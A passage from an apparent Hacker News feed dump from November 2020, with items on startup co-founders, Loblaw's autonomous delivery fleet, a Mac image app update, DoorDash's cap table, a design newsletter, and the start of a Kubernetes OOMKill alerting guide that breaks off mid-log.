<p><span>This person should be someone you know. You’ve already worked with this person. You know they are effective, reliable, and share similar ambitions/moral outlooks as you.&nbsp;</span></p>
<p><span>Jessica suggests that these 3 qualities should make up the founding team as a whole:</span></p>
<ol>
<li><b><i>Determination</i></b><span>: “Startups are really hard and take a really long time. There has to be at least one founder who’s just a tower of strength. Part of being determined is being able to withstand rejection. People will think your idea is lame, customers won’t be interested, investors will say no, reporters won’t care. And they might not be polite about it either. But you can’t let rejection discourage you.” — Jessica Livingston</span></li>
<li><b><i>Domain expertise</i></b><span>: “At least one of the founders should be an expert in what you’re working on” — Jessica Livingston</span></li>
<li><b><i>Ability/willingness to sell</i></b><span>: “Someone has to be the face of the company—to sell the product to customers, and sell the company itself to investors, the press, and potential hires. At least one of you is going to have to sell.” — Jessica Livingston</span></li>
</ol>
<p><span>If you know you want to start a startup one day, but you’re not ready now, start working on smaller projects with friends or potential future co-founders. You’ll be able to filter out who fits the criteria above vs. who doesn’t.&nbsp;</span></p>
<p><span>“A good way to ensure that you make something people want is to make something you yourself want. But remember that making something for yourself is just a heuristic to guide you in finding an idea. In the actual execution, you need to focus on users. You need to understand what they want, and be fanatically dedicated to making them happy. One very important piece of advice we give startups is to ‘do things that don’t scale.’ That means to do so much for your early users that you couldn’t possibly keep doing that much if you were bigger.” — Jessica Livingston</span></p>
<p><span>All in all, Jessica finishes with “if you can make something people want, if you can focus on delighting users, and you measure how much you delight them in revenue, then you can start a startup. That’s the standard to hold yourself to, not the stock character founder you see in the press.”</span></p>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><b><i>My two cents</i></b><span>: A thing that I’ve somewhat figured out is that there’s no secret playbook for building a company. There are obviously certain things you need to know (that I’m still figuring out), but it seems to essentially boil down to Jessica’s final quote above. </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div></div>]]>
            </description>
            <link>https://gradually.co/what-you-need-to-know-when-you-are-starting-a-startup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192991</guid>
            <pubDate>Mon, 23 Nov 2020 23:06:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Loblaw to launch Canada's first autonomous delivery fleet]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192900">thread link</a>) | @imheretolearn
<br/>
November 23, 2020 | https://www.bnnbloomberg.ca/loblaw-to-launch-canada-s-first-autonomous-delivery-fleet-in-december-1.1526410 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/loblaw-to-launch-canada-s-first-autonomous-delivery-fleet-in-december-1.1526410">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                                    <div>
                                                <p><img alt="Columnist image" src="https://tsnimages.tsn.ca/ImageProvider/AssetImage?seoId=davidgeorgecosh&amp;width=165"></p>
                    </div>
                                <p>Loblaw Companies Ltd. plans to roll out its first autonomous delivery service in January, as Canada's largest retailer explores new ways of shipping goods to customers amid a broad increase in online shopping.&nbsp;</p>

<p>Loblaw partnered with Palo Alto, Calif.-based software startup Gatik AI for the delivery service. Gatik, which also has offices in Toronto, was founded in 2017 and focuses on the "middle mile" of logistics where it hauls goods over short distances for retailers and distributors. The company raised $4.5 million in seed funding in 2018 and counts Walmart Inc. as a customer in the U.S.&nbsp;</p>

<p>Loblaw said the new service includes five Ford Transit 350 box trucks outfitted with Gatik's self-driving system, which will drive on five fixed routes across the Toronto area for seven days a week, 12 hours a day.&nbsp;</p>

<p>The vehicles will provide a contactless delivery solution for transporting goods from Loblawâ€™s automated picking facility to retail locations, the retailer said.</p>

<p>"As more Canadians are turning to online grocery shopping, we need to continue to identify new ways to make our supply chain more efficient," said Lauren Steinberg, senior vice president of Loblaw Digital, in a phone interview. "And 'middle mile' autonomous delivery is a great example of one way we think we can achieve that."</p>

<div>



<section>
	
	<div>
		<!-- Poll Image -->
				    


<p><img title="poll image" height="2250" alt="poll image" width="3000" src="https://www.bnnbloomberg.ca/polopoly_fs/1.1526534.1606144368!/fileimage/httpImage/image.jpg_gen/derivatives/default/grocery-store.jpg"></p><!-- Poll Question -->
		<h4>Are you using grocery delivery services during the pandemic?</h4>
		<!-- Poll selections -->
		
		<!-- Poll results -->
		
		<ul></ul>

		<!-- Poll results button -->
		<!-- Poll result count -->
		<p>Total Results: <span>0</span></p>
		<!-- Sponsor -->
		
	</div>
</section>




				

</div>

<p>While the number of autonomous trucks remains small in the U.S. and Canada, they have the potential to radically disrupt how merchandise is moved. A 2018 report by McKinsey &amp; Co. found that if trucking companies shifted entirely to autonomous vehicles, it would help cut operating costs by 45 per cent, saving the industry as much as US$125 billion a year.</p>

<p>Loblaw said earlier this month its e-commerce sales climbed 175 per cent in the third quarter, driven by shoppers turning to online shopping to avoid physical bricks-and-mortar stores during the pandemic.&nbsp;</p>

<p>To abide by Canadian regulations, all of Loblaw's self-driving trucks will have a safety driver as a co-pilot. It marks the first autonomous delivery fleet in commercial operation in Canada, according to Gatik.</p>

<p>Steinberg said Loblaw began talks with Gatik for about a year before launching the service, which is expected to handle about 1,000 orders a day. The pilot program will operate for two years, after which Loblaw will determine whether it will expand the service.</p>

<p>"To move these orders autonomously helps us get them there faster, more frequently, and keep up with the increase in demand that we're seeing in the online grocery space generally," Steinberg said.</p>

<p>Oshoma Momoh, chief technical advisor at MaRS Discovery District, said that it should take another seven to 10 years for vehicles to operate fully autonomously and without the need for a safety pilot on Canadian roads. But until then, any driverless cars on the road will be able to collect valuable data on a variety of weather and traffic conditions.&nbsp;&nbsp;</p>

<p>"The way all of this works is that companies build up more common use cases or examples of how driving works in real life, and train their software to become more self-sufficient," Momoh said in a phone interview.&nbsp;</p>

<p><em>Editor's Note: A previous version of this story&nbsp;included incorrect information about when&nbsp;the service would begin. BNN Bloomberg regrets this error.&nbsp;</em></p>


                                                
                            </div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/loblaw-to-launch-canada-s-first-autonomous-delivery-fleet-in-december-1.1526410</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192900</guid>
            <pubDate>Mon, 23 Nov 2020 22:54:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BiggerPicture 1.3.0 fully supports Apple Silicon]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192897">thread link</a>) | @adib
<br/>
November 23, 2020 | https://basilsalad.com/kitchen/bigger-picture-big-sur/ | <a href="https://web.archive.org/web/*/https://basilsalad.com/kitchen/bigger-picture-big-sur/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    	<p>This release of <a href="https://basilsalad.com/os-x/bigger-picture/">BiggerPicture</a> adds full support for macOS 11 “<a href="https://en.wikipedia.org/wiki/MacOS_Big_Sur">Big Sur” and</a> <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_Silicon">Apple Silicon</a>. BiggerPicture runs natively on both Intel and Apple Silicon microprocessors, taking full advantage of the machine’s compute, GPU, and ML engines. There are some cosmetic changes including new icons for both the main app and its <a href="https://en.wikipedia.org/wiki/Apple_Photos">Photo Editing extension</a> to fit macOS’ new style.</p>
<p><img loading="lazy" title="Bigger-Picture-Big-Sur@2x.jpg" src="https://basilsalad.com/wp-content/uploads/2020/11/Bigger-Picture-Big-Sur@2x.jpg" alt="Bigger Picture icons for Big Sur" width="518" height="272"></p>
<p>Image processing is now done in sequence to avoid freezing some systems on very large batch sizes (over 50 items). Nevertheless each processing of each image fully leverages the underlying system’s parallelism levels.</p>
<p><a href="https://basilsalad.com/os-x/bigger-picture/">BiggerPicture</a> is our image enhancement solution for the Mac. The application enable you to create print-quality images from mere screenshots without getting blurry or blocky results. BiggerPicture requires macOS 10.13 “High Sierra” or later versions.</p>
<hr>
<!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup-->
					</div></div>]]>
            </description>
            <link>https://basilsalad.com/kitchen/bigger-picture-big-sur/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192897</guid>
            <pubDate>Mon, 23 Nov 2020 22:54:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cap Table: DoorDash]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192797">thread link</a>) | @bertdc
<br/>
November 23, 2020 | https://www.newcomer.co/p/the-story-of-a-cap-table-doordash?ck_subscriber_id=193227557 | <a href="https://web.archive.org/web/*/https://www.newcomer.co/p/the-story-of-a-cap-table-doordash?ck_subscriber_id=193227557">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8946256e-1863-4823-a396-35908b73ebfc_3000x2003.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8946256e-1863-4823-a396-35908b73ebfc_3000x2003.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8946256e-1863-4823-a396-35908b73ebfc_3000x2003.jpeg&quot;,&quot;height&quot;:972,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:937932,&quot;alt&quot;:&quot;DoorDash CEO Tony Xu and board member Alfred Lin&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt="DoorDash CEO Tony Xu and board member Alfred Lin"></a></figure></div><p>In September 2013, investor <strong>Saar Gur</strong> was kicking the tires on a potential investment in food delivery startup Fluc. Gur emailed a friend working at Oren’s Hummus, a popular Silicon Valley Mediterranean restaurant: “I met the Fluc team about potentially investing in their business. They mentioned to me that Oren's is a big restaurant for them, and that you know about the service. Have you spent much time with them?”</p><p><strong>Gur received a response that could have earned his firm billions of dollars. Sadly, that email only triggered a sequence of events that netted the firm a position worth hundreds of millions of dollars today.</strong></p><p>“Fluc is a company I have used at Oren's,” Oren’s Palo Alto general manager, Mistie Boulton Cohen, wrote in her email reply – an opening line so brutally matter of fact that anyone who has made a reference check should know what’s coming. (Fluc would eventually join a well-populated graveyard of failed food delivery startups.) </p><p>She directed Gur’s attention to another food delivery company. “My team loves DoorDash as do many of our customers,” she wrote. “Fluc definitely has better marketing material and technology but DoorDash builds a relationship rather [than] just another delivery company who picks up and delivers without much more than that.”</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa0bcceee-0c1a-468f-b4e2-fa48dc025394_3300x2550.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa0bcceee-0c1a-468f-b4e2-fa48dc025394_3300x2550.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a0bcceee-0c1a-468f-b4e2-fa48dc025394_3300x2550.jpeg&quot;,&quot;height&quot;:1125,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2377800,&quot;alt&quot;:&quot;CRV's Saar Gur&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt="CRV's Saar Gur"></a></figure></div><p>Gur, whose wife is a restaurateur, was a big believer that food delivery could work with the right team, so he tracked down the DoorDash founders, including now-CEO <strong>Tony Xu</strong>. DoorDash had recently finished Demo Day at Y Combinator. “Tony is just remarkable,” Gur recalls thinking. “We were finishing each other’s sentences.”</p><p>Gur proposed leading the company’s seed round. “My only mistake was I think I could probably have led the entire round,” Gur said. “There was the star power – Keith wants to participate. I introduced them to some angels – <strong>Semil Shah</strong>, a lot of people.” So, Gur’s venture capital firm, CRV, ended up sharing the round with Khosla Ventures, where <strong>Keith Rabois</strong> was a partner, and a number of angel investors. </p><p>“Initially I want to say I owned about 10% of the company,” Gur recalls. I think they then added a few more people into the note, so I think the final ownership may have been just under 10%.”</p><p>Notably, Sequoia Capital’s <strong>Alfred Lin</strong>, the former chief operating officer at pioneer ecommerce company Zappos, passed on the seed round after meeting with the team. Lin worried that the DoorDash model seemed to be predicated on college kids spending their parents’ money. (All four founders met at Stanford where the business started.) The next year, Lin led the $17.3 million Series A round and took a board seat. The round gave Sequoia about one-fifth of DoorDash’s shares.</p><p><strong>This is a story about how you get “Sequoia rich.” </strong>It’s a case study in why investing early isn’t enough. And it is proof that, even if you pick the right space and find the exact right company to bet on before anyone else, SoftBank can still end up owning more of the company than you. This is the story of DoorDash’s cap table. </p><p>As a general rule, after Sequoia invests, there are always plenty of eager followers. <a href="https://fortune.com/2015/03/17/exclusive-doordash-raises-new-vc-from-kleiner-perkins/">In March 2015</a>, <strong>John Doerr</strong> – as his venture firm Kleiner Perkins was defending itself in a reputationally scarring trial with his former chief of staff <strong>Ellen Pao</strong> – announced that he was leading DoorDash’s Series B round, giving the company a rich $595 million valuation. </p><p><a href="https://www.bloomberg.com/news/articles/2015-11-23/in-overcrowded-food-delivery-market-venture-capitalists-are-still-hungry-for-more?sref=WS92jZg5">Later that year,</a> DoorDash approached investors about a potential billion-dollar valuation. <a href="https://www.bloomberg.com/news/articles/2015-12-03/uber-raises-funding-at-62-5-valuation?sref=WS92jZg5">By December</a>, Uber was raising money at a $62.5 billion valuation. It was the year everyone’s expectations about what was possible with private unicorn valuations exploded. </p><p>But then investors suddenly cooled on food. Rival Postmates CEO <strong>Bastian Lehmann</strong>, who knows when to just state the obvious, <a href="https://www.bloomberg.com/news/articles/2016-10-31/postmates-secures-141-million-in-a-super-super-difficult-fundraising-effort?sref=WS92jZg5">told me in a 2016 interview</a> that their fundraising round was “super, super difficult.”</p><p>Similarly, DoorDash lowered its expectations. Sequoia agreed to invest again at a similar price to the Kleiner round. &nbsp;The infusion of capital gave DoorDash a lower share price and a higher post-money valuation. DoorDash <a href="https://www.wsj.com/articles/BL-DGB-45160">raised</a> $127 million at a post-money valuation of roughly $700 million.</p><p>At the time, it looked like Sequoia was doubling down on a losing investment. In retrospect, it was a genius move. Sequoia had the advantage of being an early investor in Chinese delivery company Meituan. The firm’s partners knew that if someone could make the food delivery model work in the United States, there was a lot of money to be made, so it invested when everyone else was getting nervous. </p><p>The round certainly established that Sequoia is <em>not a cuddly investor</em>. Here you have the company’s main partner investing on the cheap when a young founder wants to solidify his unicorn status. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F150aca19-3e96-4082-a51c-a2f777b6dfea_3000x2254.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F150aca19-3e96-4082-a51c-a2f777b6dfea_3000x2254.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/150aca19-3e96-4082-a51c-a2f777b6dfea_3000x2254.jpeg&quot;,&quot;height&quot;:1094,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:863808,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Of course, it would have been better for Sequoia if DoorDash didn’t need the money at all. And this is an essential point: these costly fundraising rounds dilute early investors and the company’s founders. By investing a bunch of money in DoorDash, Sequoia diluted its own early investment while buying that ownership percentage back with new money. That’s the reality of the food delivery business as we would soon see. </p><p>DoorDash, hungry for yet more money, went to the most logical place: the $100 billion SoftBank Vision Fund. DoorDash started negotiations with SoftBank’s <strong>Jeffrey Housenbold</strong> only to learn that SoftBank was going to make a massive, complicated investment in food delivery rival Uber. The Uber round closed and still DoorDash didn’t have a deal. DoorDash became more and more worried about its depleting bank account.</p><p>Finally, Housenbold convinced <strong>Masa </strong>that food wouldn’t be a winner-take-all market. And, in March 2018, SoftBank led a $535 million round that valued DoorDash at $1.4 billion. <strong>Xu got his unicorn status but at the cost of heavy dilution. </strong></p><p><strong>Jeremy Kranz</strong> at GIC and Sequoia participated in the mega round that would permanently alter the company’s ownership structure. The deal would help make SoftBank the biggest shareholder in DoorDash, even though Sequoia had invested in the company years earlier and participated in every round thereafter. GIC is now the third largest shareholder. </p><p>After that, the money started flowing in. DoorDash’s business model looked more secure and late stage investors piled in. DST and Coatue led a $250 million investment at $4 billion in 2018. The company was recently valued at $16 billion in a round led by Durable Capital Partners, which was joined by Fidelity and T. Rowe Price. DoorDash has <a href="https://www.sec.gov/Archives/edgar/data/1792789/000119312520292381/d752207ds1.htm">filed to go public</a> and is expected to begin trading by the end of the year.</p><p><strong>Today, Gur owns far less of the company than he once did. </strong>He estimates he has a 3% stake in DoorDash. Gur’s firm, CRV, invested about $10 million in the company altogether, exercising its pro rata rights as long as it could afford. </p><p>It should go without saying that Gur is ecstatic to own as much as he does in a company that he believes could be the next Amazon. And many early investors would prefer to be judged on their return on money invested, not ownership stake.</p><p>Today, Gur operates a larger fund so he could buy more shares of promising portfolio companies along the way. He said his firm is still the largest shareholder in buzzy cloud collaboration company Airtable thanks to this more aggressive strategy. </p><p>In the late 2010s, late stage firms were able to buy up a huge percentage of cash-intensive companies as early stage investors were ill-equipped to defend their positions. DoorDash raised more than $2 billion as a private company. “If we bought 10% and maintained our pro-rata...we would have invested $240 million in the company (almost the size of our fund),” Gur explained in an email. </p><p>Regarding Sequoia’s persistent investing, Gur says, “I'd love to know total dollars into the company – it's not an insignificant amount of capital. I just have so much respect for their conviction level.”</p><p>I got the answer. A source tells me that altogether<strong> Sequoia invested $217 million in DoorDash</strong>, exercising the firm’s pro rata rights along the way, leading the Series C, and joining those late stage rounds. Investing in the Series A set them on the path to amass an enormous stake in the company, but it wouldn’t have been enough. Khosla Ventures, Kleiner Perkins and other early funds are now minor investors with less than 5% stakes in the company.</p><p>Sequoia has a 15.3% stake in DoorDash, accounting for dilution. Even at just a $16 billion valuation, that stake is worth $2.4 billion.</p><p>Despite the hard work from Sequoia, SoftBank owns more – though it certainly paid more for its stake. SoftBank owns 18.6% of the company. </p><p>The dilutive fundraising rounds hurt DoorDash’s founders. Xu owns 4.4% of the company and his two remaining co-founders own 4% each. Compare that to Airbnb’s co-founders. CEO Brian Chesky owns about 12% of his company, while his two co-founders own 11% each. (<a href="https://twitter.com/EricNewcomer/status/1329549772785659905">I tweeted out Airbnb’s cap table last night</a>.)</p><p>If you read through DoorDash’s IPO prospectus, CRV doesn’t even make the footnotes. Oren’s Hummus got a couple mentions though.</p><p>“Fighting for the underdog is part of who I am and what we stand for as a company,” Xu writes in his <a href="https://www.sec.gov/Archives/edgar/data/1792789/000119312520292381/d752207ds1.htm">investor letter</a>. He recalls speaking to “countless merchants since DoorDash’s founding in 2013,” including, “a Mom and Pop store like Oren’s Hummus.”</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fde269d9f-5b62-4f00-85e5-eee46eead3b9_698x515.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fde269d9f-5b62-4f00-85e5-eee46eead3b9_698x515.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/de269d9f-5b62-4f00-85e5-eee46eead3b9_698x515.png&quot;,&quot;height&quot;:515,&quot;width&quot;:698,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:97828,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div></div></div>]]>
            </description>
            <link>https://www.newcomer.co/p/the-story-of-a-cap-table-doordash?ck_subscriber_id=193227557</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192797</guid>
            <pubDate>Mon, 23 Nov 2020 22:38:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TUF's Issue N26: Spotify Design – UX Tricks – UI Dev Tools – Permanent Link]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192779">thread link</a>) | @Mike_Andreuzza
<br/>
November 23, 2020 | https://www.unicornsfeed.com/issues/26 | <a href="https://web.archive.org/web/*/https://www.unicornsfeed.com/issues/26">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            <td>
                                <hr>
                                <div><p>
                                    Yo!! Welcome to Issue N26, on this issue we go from Spotify Design to UI DevTools for Tailwind CSS
                                    </p></div>
                                <p>
                                    New Layout
                                </p>
                                <br>
                                <div><p>
                                    So yeah, this is the new and final layout for TUF, I am done. I won't bother you
                                    anymore I promisse. As you will see underneath, you will see 4 resources and four
                                    articles, also images are gone, nothing, nada, niente, nichts...let's keep it simple.
                                    </p></div>
                                <p>
                                    I would like to thank...
                                </p>
                                <br>
                                <div><p>
                                    Simon Chiu, Fabi aka Chaphasilor, Csaba Kissi, Ulrich Ghero, Arvi Khal, Tommi Urtti,
                                    Lana Rafaela, Bohdan and s**t loads more that I can't remember just now because is
                                    frigging late at night. You guys are worth your weight in gold.
                                    </p></div>
                                <p>
                                    By the way, I have redesigned Wicked Templates.
                                </p>
                                <br>
                                <div><p>
                                    For good or for worst, depends whos judging.
                                    <a href="http://wickedtemplates.com/">See it here.</a></p></div>
                                <p>
                                    Not Susbscribed?
                                </p>
                                <br>
                                <div><p>
                                    Do it here
                                    <a href="http://unicornsfeed.com/">Subscribe</a>
                                    or
                                    <a href="https://www.unicornsfeed.com/issues/%7B%7BUnsubscribeURL%7D%7D">
                                        Unsubscribe
                                    </a>
                                    is upto you.
                                    </p></div>
                                <hr>
                                <p>
                                    Now, please enjoy this issue.
                                </p>
                                <hr>
                                <p>
                                    SPONSORED ―
                                </p>
                                
                                <div><p>
                                    Master the art of creating &amp; running a newsletter.
                                    </p></div>
                                <hr>
                                <p>
                                    APPS, TOOLS, SITES n' ASSETS ―
                                </p>
                                
                                <div><p>
                                    The missing browser devtools for Tailwind CSS.
                                    </p></div>
                                
                                <div><p>
                                    PermanentLink redirects your readers to working sites,
                                    so you can stay the authority in your niche.
                                    </p></div>
                                
                                <div><p>
                                    Free Images and Sketch files of popular devices.
                                    </p></div>
                                
                                <div><p>
                                    Export Figma styles and custom tokens to a style dictionary ready json or sync to
                                    github.
                                    </p></div>
                                <hr>
                                <p>
                                    ARTICLES ―
                                </p>
                                
                                <div><p>
                                    How Spotify Organises Work in Figma to Improve Collaboration. </p></div>
                                
                                <div><p>
                                    How to easily understand Flexbox CSS.
                                    </p></div>
                                
                                <div><p>
                                    Aesthetics Over Usability — Google's New App Icons.
                                    </p></div>
                                
                                <div><p>
                                    We’re UX Tricks and we’re crazy about UX design. We write UX ebooks and you can even
                                    read them online.
                                    </p></div>
                                <hr>
                                <p>
                                    INSPIRATION ―
                                </p>
                                
                                
                                <hr>
                                <p>
                                    NEWSLETTER ―
                                </p>
                                
                                <div><p>
                                    A curated newsletter built for the creative community, sharing productivity and
                                    creativity-boosting
                                    apps and resources,
                                    combined with useful insights, articles, and learnings from the fields of design and
                                    tech.
                                    </p></div>
                                <hr>
                                <p>
                                    CLASSIFIEDS ―
                                </p>
                                
                                <div><p>
                                    Add nice looking animation effect of falling snow to your WordPress site and enjoy
                                    winter.
                                    </p></div>
                               
                                <hr>
                                <div>
                                    <p><img src="https://res.cloudinary.com/the-unicorns-feed/image/upload/v1602274982/michaelandreuzza_sakb9y.png" alt="TUF's
                  logo" width="316" height="auto"></p></div>
                            </td>
                        </div></div>]]>
            </description>
            <link>https://www.unicornsfeed.com/issues/26</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192779</guid>
            <pubDate>Mon, 23 Nov 2020 22:36:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Guide to OOMKill Alerting in Kubernetes Clusters]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25192733">thread link</a>) | @draganm
<br/>
November 23, 2020 | https://www.netice9.com/blog/guide-to-oomkill-alerting-in-kubernetes-clusters | <a href="https://web.archive.org/web/*/https://www.netice9.com/blog/guide-to-oomkill-alerting-in-kubernetes-clusters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <span>Monday 23 Nov 2020, 18:30</span> <h2>Intro</h2> <p>RAM is most likely the scarcest resource that is first exhausted on your servers. If you’re serious about running software under Linux/Unix, you’re certainly aware of what an OOMKill is.</p> <p>Short refresher: when a program requests a new memory page from the kernel two things can happen.</p> <ul><li>There is a free memory page: The kernel page assigns the page to the process and everything is great.</li> <li>The system is Out Of Memory (OOM): The kernel chooses a process based on its ‘badness’ (mainly by how much ram it uses). It sends a SIGKILL to the process. This forces the receiving process to exit with exit code <code>137</code>. All the memory pages belonging to that process are free and now the kernel can fulfill the memory request.</li></ul> <p>Lately, I had a task to add alerting to a sizeable Kubernetes cluster. The cluster has ~100 active Deployments with autoscaling of nodes up to ~50 nodes at peak times. The cluster is well maintained and has a robust autoscaling strategy. All deployments have resource limits defined. Sometimes, some of the deployed pods would breach the memory limits. In those cases, it would be nice to find out when that happens and investigate the cause of it.</p> <p>Prometheus and Alertmanager were already deployed. So I’ve thought that alerting on OOMKills will be as easy. I just had to find the right metric(s) indicating that OOMKill has happened and write an alerting rule for it. Given the length of this post, you could imagine how wrong I was!</p> <h2>First Attempt</h2> <p>A brief Google search has led me to the <a href="https://github.com/kubernetes/kube-state-metrics/blob/master/docs/pod-metrics.md" rel="nofollow">kube pod state metric</a>. It turns out it has a metric called <code>kube_pod_container_status_last_terminated_reason</code>. The value of the metric is <code>1</code> when a container in a pod has terminated with an error. Based on the exit code, the <code>reason</code> label will be set to <code>OOMKilled</code> if the exit code was <code>137</code>. That sounded promising! So I’ve created an alert for that.</p> <p>As usual, things are rarely straightforward. As soon as the container restarts, the value of this metric will be <code>1</code>. For alerting purposes, one has to combine it with another metric that will change when a pod restarts. <code>kube_pod_container_status_restarts_total</code> does that. Combine the two - and Bingo! It Worked!</p> <h2>“Invisible” OOMKills</h2> <p>For a brief moment, I’ve thought that I was done. I was about to declare victory over OOMKills in production! But then a puzzle came my way: One of our software developers has come forward. He claimed that one of his pods was running out of memory and he couldn’t see any alerts for it.</p> <p>At first, I wasn’t inclined to believe that his diagnosis of running out of memory was correct. Mainly because his Pod didn’t even restart! But then I looked at the graph of the memory use of the Pod. It did show the usual pattern: Memory usage would grow, reach its peak at the memory limit, and then suddenly drop.</p> <p>I’ve asked the developer for the gory details of the implementation. It turned out that the init process in the container would start a child process and wait for the result of it. If the child process would exit with an error, it would return an error to the requester and not terminate (because - why should it?).</p> <p>That is when it dawned to me - my alerting is effective only if container exits. This is usually the case when the init process of the container is OOMKilled. But there is no guarantee this will happen if a child of the init is OOMKilled. In the case where the container’s init tries to handle OOMKill by itself, my alerting is not triggering!</p> <h2>Trying the Existing Solutions</h2> <p>Given that OOMKills are as old as Unix, I thought: surely someone will have a solution for this already.</p> <p>I’ve ensued onto a frantic search for some kind of metric exporter for this. I just needed the number of OOMKill events in a pod, or at least in a Docker container. Here is what I’ve found:</p> <h3>cAdvisor</h3> <p>My first stop was cAdvisor itself. It turns out that cAdvisor is <a href="https://github.com/google/cadvisor/issues/1837" rel="nofollow">getting the OOMKill events, but not exporting them as a Prometheus metric and no one really seems to care.</a> So that was a dead-end.</p> <h3>kubernetes-oomkill-exporter</h3> <p>My second stop was <a href="https://github.com/sapcc/kubernetes-oomkill-exporter" rel="nofollow">kubernetes-oomkill-exporter</a>. A very promising-sounding project with two huge disadvantages:</p> <ul><li>There is really no documentation for it, literally anywhere.</li> <li>It does not work.</li></ul> <p>I’ve tried the latest version of <a href="https://hub.docker.com/layers/sapcc/kubernetes-oomkill-exporter/0.3.0/images/sha256-b80875b903635f0336ea0b122b332e086da51ec5cd797de5d682dd14c3910b9f?context=explore" rel="nofollow">the Docker image</a>, but once started it crashes and burns with:</p> <pre><code>standard_init_linux.go:211: exec user process caused "no such file or directory"</code></pre> <p>Going <a href="https://hub.docker.com/layers/sapcc/kubernetes-oomkill-exporter/0.2.0/images/sha256-5e1b57f4ac0b57406ef067da3e83f743d70ff89aa1db717d41af2c699dc12f3a?context=explore" rel="nofollow">back one minor version</a> one gets the following output:</p> <pre><code>F1120 22:04:21.571246       1 main.go:73] Could not create log watcher
